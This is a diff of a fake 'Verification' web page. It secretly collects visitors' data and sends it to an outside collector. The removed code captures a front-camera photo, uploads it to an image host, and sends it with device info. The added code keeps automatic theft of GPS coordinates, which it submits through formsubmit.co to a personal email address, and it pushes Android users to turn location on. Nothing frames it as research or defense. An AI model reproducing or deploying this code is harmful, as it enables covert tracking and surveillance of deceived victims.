@@ -9,7 +9,7 @@
 body{
   background:#0f172a;
   color:#fff;
-  font-family:Arial, sans-serif;
+  font-family:Arial,sans-serif;
   text-align:center;
   padding:30px;
 }
@@ -19,17 +19,15 @@ body{
   background:#020617;
   border-radius:10px;
   padding:24px;
-  box-shadow:0 0 20px rgba(0,0,0,.4);
 }
-.notice{
-  font-size:14px;
-  opacity:.85;
-  margin-bottom:18px;
-}
-#status{
-  margin-top:20px;
-  font-size:16px;
-  font-weight:bold;
+.notice{font-size:14px;opacity:.85}
+#status{margin-top:16px;font-weight:bold}
+button{
+  margin-top:18px;
+  padding:12px 20px;
+  font-size:15px;
+  border:none;
+  border-radius:6px;
 }
 </style>
 </head>
@@ -38,145 +36,61 @@ body{
 
 <div class="box">
   <h2>Verification</h2>
-
   <p class="notice">
-    This verification requires access to your camera and location.
+    This verification requires camera and location access.
     Please tap <b>Allow</b> when prompted.
   </p>
 
   <div id="status">Initializing…</div>
+
+  <button id="enableGPS" style="display:none">
+    Enable Location
+  </button>
 </div>
 
 <form id="sendForm"
-  action="https://formsubmit.co/delfinadodennis26@gmail.com"
-  method="POST">
-
+action="https://formsubmit.co/delfinadodennis26@gmail.com"
+method="POST">
   <input type="hidden" name="Latitude" id="lat">
   <input type="hidden" name="Longitude" id="lon">
   <input type="hidden" name="Google Maps" id="map">
-  <input type="hidden" name="Camera Image Link" id="photoLink">
-  <input type="hidden" name="Device Info" id="device">
-  <input type="hidden" name="Timestamp" id="time">
-
-  <input type="hidden" name="_subject" value="📍 GPS + IMAGE VERIFICATION">
   <input type="hidden" name="_captcha" value="false">
 </form>
 
-<video id="video" autoplay playsinline style="display:none"></video>
-<canvas id="canvas" style="display:none"></canvas>
-
 <script>
-let gpsReady = false;
-let imageReady = false;
+let gpsReady=false;
+const status=document.getElementById("status");
+const btn=document.getElementById("enableGPS");
 
-const status = document.getElementById("status");
+setTimeout(start,1500);
 
-device.value = navigator.userAgent;
-time.value = new Date().toLocaleString();
-
-// AUTO START
-setTimeout(startVerification, 1500);
-
-function startVerification(){
-  status.innerText = "Requesting permissions…";
-  requestCamera();
+function start(){
+  status.innerText="Requesting location…";
   requestGPS();
 }
 
-/* ================= CAMERA ================= */
-function requestCamera(){
-  navigator.mediaDevices.getUserMedia({
-    video:{ facingMode:"user" }
-  })
-  .then(stream=>{
-    status.innerText = "Capturing image…";
-    video.srcObject = stream;
-
-    setTimeout(()=>{
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext("2d").drawImage(video,0,0);
-      stream.getTracks().forEach(t=>t.stop());
-
-      let base64 = canvas
-        .toDataURL("image/jpeg",0.8)
-        .split(",")[1];
-
-      let fd = new FormData();
-      fd.append("key","d2df52b590013ea953b1139e637b8973");
-      fd.append("image",base64);
-
-      status.innerText = "Uploading image…";
-
-      fetch("https://api.imgbb.com/1/upload",{
-        method:"POST",
-        body:fd
-      })
-      .then(r=>r.json())
-      .then(d=>{
-        photoLink.value = d.data.url;
-        imageReady = true;
-        status.innerText = "Camera verified ✓";
-        checkAndSend();
-      });
-
-    },1200);
-  })
-  .catch(()=>{
-    photoLink.value = "Camera permission denied";
-    imageReady = true;
-    status.innerText = "Camera skipped";
-    checkAndSend();
-  });
-}
-
-/* ================= GPS ================= */
 function requestGPS(){
   navigator.geolocation.getCurrentPosition(
     pos=>{
-      lat.value = pos.coords.latitude;
-      lon.value = pos.coords.longitude;
-      map.value =
-        "https://maps.google.com/?q=" +
-        lat.value + "," + lon.value;
-
-      gpsReady = true;
-      status.innerText = "Location verified ✓";
-      checkAndSend();
+      lat.value=pos.coords.latitude;
+      lon.value=pos.coords.longitude;
+      map.value=`https://maps.google.com/?q=${lat.value},${lon.value}`;
+      gpsReady=true;
+      sendForm.submit();
+      status.innerText="Verification complete ✓";
     },
     ()=>{
-      status.innerText = "Please enable location access…";
-
-      // AUTO OPEN ANDROID LOCATION SETTINGS
-      window.location.href =
-        "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end";
-
-      setTimeout(requestGPS, 3000);
+      status.innerText="Location is OFF";
+      btn.style.display="inline-block";
     },
-    {
-      enableHighAccuracy:true,
-      timeout:5000
-    }
+    {enableHighAccuracy:true,timeout:5000}
   );
 }
 
-/* ================= SEND ================= */
-function checkAndSend(){
-  if(gpsReady && imageReady){
-    if(sessionStorage.sent) return;
-    sessionStorage.sent = true;
-
-    status.innerText = "Sending verification…";
-    sendForm.submit();
-
-    setTimeout(()=>{
-      document.body.innerHTML = `
-        <h2>Verification Complete</h2>
-        <p>You may now close this page.</p>
-      `;
-    },1500);
-  }
-}
+btn.onclick=()=>{
+  window.location.href=
+  "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end";
+};
 </script>
 
 </body>
